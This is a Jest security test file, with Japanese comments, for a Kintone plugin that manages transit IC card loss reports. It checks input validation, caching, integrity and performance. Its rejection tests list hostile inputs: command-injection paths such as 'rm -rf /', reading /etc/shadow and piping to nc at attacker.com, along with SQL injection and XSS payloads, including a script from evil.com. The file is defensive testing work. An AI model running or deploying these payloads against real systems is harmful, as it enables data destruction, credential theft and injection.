/**
 * Kintone ICカード紛失対応プラグイン - 交通機関データ管理テスト
 * TransportationManagerクラスのセキュリティテスト（IPA準拠）
 * 
 * @version 3.0.0
 * @author Kintone ICカード紛失対応チーム
 */

import TransportationManager from '../src/js/transportation-manager.js';
import { jest } from '@jest/globals';

// モック設定
jest.mock('../src/js/security/input-validator.js');
jest.mock('../src/js/security/hash-manager.js');
jest.mock('../src/js/common/logger.js');

describe('TransportationManager - Security Tests', () => {
    let manager;
    
    beforeEach(() => {
        manager = new TransportationManager();
    });
    
    afterEach(() => {
        jest.clearAllMocks();
    });
    
    describe('データロードセキュリティテスト', () => {
        test('不正なファイルパスの拒否（OSコマンドインジェクション対策）', async () => {
            const maliciousPaths = [
                '../../../etc/passwd',
                'config.json; rm -rf /',
                'config.json && cat /etc/shadow',
                'config.json | nc attacker.com 1234',
                '../../windows/system32/config/sam',
                'config.json`whoami`',
                'config.json$(id)',
                'config.json\\..\\..\\windows\\system32'
            ];
            
            for (const maliciousPath of maliciousPaths) {
                const result = await manager.loadTransportationData(maliciousPath);
                expect(result.success).toBe(false);
                expect(result.error).toBe('INVALID_FILE_PATH');
                expect(result.security).toBe('PATH_TRAVERSAL_DETECTED');
            }
        });
        
        test('許可されたファイルパスの受け入れ', async () => {
            const validPaths = [
                '/src/data/transportation-config.json',
                './data/transportation-config.json',
                'transportation-config.json',
                '/app/config/transportation.json'
            ];
            
            for (const validPath of validPaths) {
                // ファイル存在チェックは失敗するが、パス検証は通過するはず
                const result = await manager.loadTransportationData(validPath);
                // セキュリティエラーではないことを確認
                expect(result.security).not.toBe('PATH_TRAVERSAL_DETECTED');
            }
        });
        
        test('SQLインジェクション試行の検出', () => {
            const sqlInjectionAttempts = [
                "'; DROP TABLE transportation; --",
                "' OR '1'='1",
                "' UNION SELECT * FROM users --",
                "'; INSERT INTO logs VALUES('hacked'); --",
                "' OR 1=1 #",
                "admin'--",
                "' OR 'x'='x",
                "'; EXEC xp_cmdshell('dir'); --"
            ];
            
            for (const injection of sqlInjectionAttempts) {
                const result = manager.validateProviderInput(injection);
                expect(result.valid).toBe(false);
                expect(result.security).toBe('SQL_INJECTION_DETECTED');
            }
        });
    });
    
    describe('プロバイダー検証セキュリティテスト', () => {
        test('XSS攻撃の防止', () => {
            const xssAttempts = [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                'javascript:alert("XSS")',
                '<iframe src="javascript:alert(\'XSS\')"></iframe>',
                '"><script>alert("XSS")</script>',
                '<svg onload=alert("XSS")>',
                '<body onload=alert("XSS")>',
                '<script src="http://evil.com/xss.js"></script>'
            ];
            
            for (const xss of xssAttempts) {
                const result = manager.validateProviderInput(xss);
                expect(result.valid).toBe(false);
                expect(result.security).toBe('XSS_DETECTED');
            }
        });
        
        test('正常な入力の受け入れ', () => {
            const validInputs = [
                '名古屋市営地下鉄',
                'JR東海',
                '名古屋鉄道',
                'あおなみ線',
                'ゆとりーとライン',
                'Nagoya Municipal Subway',
                'manaca'
            ];
            
            for (const validInput of validInputs) {
                const result = manager.validateProviderInput(validInput);
                expect(result.valid).toBe(true);
                expect(result.sanitizedValue).toBeDefined();
            }
        });
        
        test('過度に長い入力の拒否', () => {
            const longInput = 'a'.repeat(1001); // 1000文字制限を超過
            const result = manager.validateProviderInput(longInput);
            expect(result.valid).toBe(false);
            expect(result.error).toBe('EXCESSIVE_LENGTH');
        });
    });
    
    describe('ICカード検証セキュリティテスト', () => {
        test('ICカード番号形式の検証', () => {
            const testCases = [
                { input: '1234567890123456', expected: true, type: 'MANACA' },
                { input: '123456789012345', expected: false }, // 15桁
                { input: '12345678901234567', expected: false }, // 17桁
                { input: 'abcd567890123456', expected: false }, // 英字含有
                { input: '1234-5678-9012-3456', expected: false }, // ハイフン含有
                { input: '', expected: false }, // 空文字
                { input: null, expected: false }, // null
                { input: undefined, expected: false } // undefined
            ];
            
            for (const testCase of testCases) {
                const result = manager.validateICCardNumber(testCase.input);
                expect(result.valid).toBe(testCase.expected);
                if (testCase.expected && testCase.type) {
                    expect(result.cardType).toBe(testCase.type);
                }
            }
        });
        
        test('ICカード番号のマスキング機能', () => {
            const cardNumber = '1234567890123456';
            const result = manager.validateICCardNumber(cardNumber);
            
            if (result.valid) {
                expect(result.maskedNumber).toMatch(/^\d{4}\*+\d{4}$/);
                expect(result.maskedNumber).not.toContain(cardNumber.substring(4, 12));
            }
        });
    });
    
    describe('キャッシュセキュリティテスト', () => {
        test('キャッシュデータの整合性検証', async () => {
            // 正常なデータでキャッシュを設定
            const validData = {
                providers: {
                    'nagoya-subway': {
                        name: '名古屋市営地下鉄',
                        contact: '052-123-4567'
                    }
                }
            };
            
            await manager.setCacheData('test-key', validData);
            const cachedData = await manager.getCacheData('test-key');
            
            expect(cachedData).toEqual(validData);
        });
        
        test('改ざんされたキャッシュデータの検出', async () => {
            // 正常なデータでキャッシュを設定
            const originalData = {
                providers: {
                    'test-provider': {
                        name: 'テストプロバイダー',
                        contact: '03-1234-5678'
                    }
                }
            };
            
            await manager.setCacheData('integrity-test', originalData);
            
            // キャッシュデータを不正に変更をシミュレート（実際のテストでは外部から改ざん）
            const tamperedData = {
                providers: {
                    'test-provider': {
                        name: '改ざんされたプロバイダー',
                        contact: '000-0000-0000',
                        maliciousField: '<script>alert("hack")</script>'
                    }
                }
            };
            
            // 改ざん検出のテスト（ハッシュ検証等）
            const integrityCheck = manager.verifyDataIntegrity(tamperedData, originalData);
            expect(integrityCheck.valid).toBe(false);
        });
        
        test('キャッシュの有効期限チェック', async () => {
            const testData = { test: 'data' };
            const shortTtl = 1; // 1秒
            
            await manager.setCacheData('ttl-test', testData, shortTtl);
            
            // 即座に取得 - 成功するはず
            let cachedData = await manager.getCacheData('ttl-test');
            expect(cachedData).toEqual(testData);
            
            // 2秒待機
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            // 期限切れで取得失敗するはず
            cachedData = await manager.getCacheData('ttl-test');
            expect(cachedData).toBeNull();
        });
    });
    
    describe('データ整合性テスト', () => {
        test('設定ファイルスキーマの検証', () => {
            const validConfig = {
                version: '1.0.0',
                region: 'nagoya',
                providers: {},
                icCardTypes: {},
                securitySettings: {}
            };
            
            const result = manager.validateConfigSchema(validConfig);
            expect(result.valid).toBe(true);
            
            const invalidConfig = {
                invalidField: 'invalid'
            };
            
            const invalidResult = manager.validateConfigSchema(invalidConfig);
            expect(invalidResult.valid).toBe(false);
        });
        
        test('プロバイダーデータの整合性チェック', () => {
            const validProvider = {
                id: 'nagoya-subway',
                name: '名古屋市営地下鉄',
                contact: {
                    phone: '052-123-4567',
                    email: 'info@kotsu.city.nagoya.jp'
                },
                supportedCards: ['MANACA', 'TOICA'],
                procedures: {
                    report: ['手順1', '手順2'],
                    reissue: ['再発行手順1']
                }
            };
            
            const result = manager.validateProviderData(validProvider);
            expect(result.valid).toBe(true);
            
            const invalidProvider = {
                id: 'test',
                // 必須フィールドが不足
            };
            
            const invalidResult = manager.validateProviderData(invalidProvider);
            expect(invalidResult.valid).toBe(false);
        });
    });
    
    describe('パフォーマンス・セキュリティテスト', () => {
        test('大量データ処理時のメモリ使用量チェック', async () => {
            const initialMemory = process.memoryUsage().heapUsed;
            
            // 大量のプロバイダーデータを処理
            const largeDataSet = {};
            for (let i = 0; i < 1000; i++) {
                largeDataSet[`provider-${i}`] = {
                    name: `プロバイダー${i}`,
                    contact: `052-123-${i.toString().padStart(4, '0')}`
                };
            }
            
            await manager.processLargeDataSet(largeDataSet);
            
            const finalMemory = process.memoryUsage().heapUsed;
            const memoryIncrease = finalMemory - initialMemory;
            
            // メモリ使用量が異常に増加していないことを確認（100MB以下）
            expect(memoryIncrease).toBeLessThan(100 * 1024 * 1024);
        });
        
        test('レスポンス時間の検証', async () => {
            const startTime = Date.now();
            
            await manager.getProviderInfo('nagoya-subway');
            
            const responseTime = Date.now() - startTime;
            
            // レスポンス時間が1秒以下であることを確認
            expect(responseTime).toBeLessThan(1000);
        });
        
        test('同時リクエスト処理のテスト', async () => {
            const concurrentRequests = Array.from({ length: 10 }, (_, i) => 
                manager.getProviderInfo(`provider-${i}`)
            );
            
            const startTime = Date.now();
            const results = await Promise.all(concurrentRequests);
            const totalTime = Date.now() - startTime;
            
            // 全てのリクエストが5秒以内に完了することを確認
            expect(totalTime).toBeLessThan(5000);
            expect(results).toHaveLength(10);
        });
    });
    
    describe('エラーハンドリングテスト', () => {
        test('ネットワークエラーの適切な処理', async () => {
            // ネットワークエラーをシミュレート
            jest.spyOn(global, 'fetch').mockRejectedValue(new Error('Network error'));
            
            const result = await manager.fetchExternalData('http://example.com/data');
            
            expect(result.success).toBe(false);
            expect(result.error).toBe('NETWORK_ERROR');
            expect(result.retryable).toBe(true);
        });
        
        test('ファイルシステムエラーの処理', async () => {
            // ファイル読み込みエラーをシミュレート
            const result = await manager.loadTransportationData('/nonexistent/path/config.json');
            
            expect(result.success).toBe(false);
            expect(result.error).toBe('FILE_NOT_FOUND');
        });
        
        test('不正なJSONデータの処理', async () => {
            const invalidJson = '{ invalid json }';
            
            const result = manager.parseConfigData(invalidJson);
            
            expect(result.success).toBe(false);
            expect(result.error).toBe('INVALID_JSON');
        });
    });
    
    describe('セキュリティ統計テスト', () => {
        test('セキュリティ違反の統計記録', () => {
            // セキュリティ違反を複数回発生させる
            manager.validateProviderInput('<script>alert("xss")</script>');
            manager.validateProviderInput("'; DROP TABLE test; --");
            manager.validateProviderInput('<img src=x onerror=alert()>');
            
            const stats = manager.getSecurityStats();
            
            expect(stats.totalViolations).toBeGreaterThan(0);
            expect(stats.violationTypes.xss).toBeGreaterThan(0);
            expect(stats.violationTypes.sqlInjection).toBeGreaterThan(0);
        });
        
        test('統計のリセット機能', () => {
            // 統計データを生成
            manager.validateProviderInput('<script>test</script>');
            
            let stats = manager.getSecurityStats();
            expect(stats.totalViolations).toBeGreaterThan(0);
            
            // 統計をリセット
            manager.resetSecurityStats();
            
            stats = manager.getSecurityStats();
            expect(stats.totalViolations).toBe(0);
        });
    });
});

describe('TransportationManager - Integration Tests', () => {
    let manager;
    
    beforeEach(() => {
        manager = new TransportationManager();
    });
    
    test('完全なワークフローテスト', async () => {
        // 1. 設定ファイルのロード
        const loadResult = await manager.loadTransportationData('./test-data/sample-config.json');
        expect(loadResult.success).toBe(true);
        
        // 2. プロバイダー情報の取得
        const providerInfo = await manager.getProviderInfo('nagoya-subway');
        expect(providerInfo.success).toBe(true);
        expect(providerInfo.provider.name).toBe('名古屋市営地下鉄');
        
        // 3. ICカード対応確認
        const cardSupport = manager.checkCardSupport('nagoya-subway', 'MANACA');
        expect(cardSupport.supported).toBe(true);
        
        // 4. 報告手順の取得
        const procedures = manager.getReportProcedures('nagoya-subway', 'MANACA');
        expect(procedures.success).toBe(true);
        expect(procedures.procedures.length).toBeGreaterThan(0);
        
        // 5. 統計の確認
        const stats = manager.getSecurityStats();
        expect(stats.totalRequests).toBeGreaterThan(0);
    });
    
    test('エラー状況での動作確認', async () => {
        // 存在しないプロバイダーの情報取得
        const result = await manager.getProviderInfo('nonexistent-provider');
        expect(result.success).toBe(false);
        expect(result.error).toBe('PROVIDER_NOT_FOUND');
        
        // サポートされていないカードタイプ
        const cardSupport = manager.checkCardSupport('nagoya-subway', 'INVALID_CARD');
        expect(cardSupport.supported).toBe(false);
        expect(cardSupport.error).toBe('UNSUPPORTED_CARD_TYPE');
    });
});

describe('TransportationManager - Load Testing', () => {
    let manager;
    
    beforeAll(() => {
        manager = new TransportationManager();
    });
    
    test('高負荷時のパフォーマンス', async () => {
        const startTime = Date.now();
        const promises = [];
        
        // 100個の同時リクエストを実行
        for (let i = 0; i < 100; i++) {
            promises.push(manager.getProviderInfo('nagoya-subway'));
        }
        
        const results = await Promise.all(promises);
        const endTime = Date.now();
        
        // 全てのリクエストが成功することを確認
        results.forEach(result => {
            expect(result.success).toBe(true);
        });
        
        // 全体の処理時間が10秒以内であることを確認
        expect(endTime - startTime).toBeLessThan(10000);
    });
});
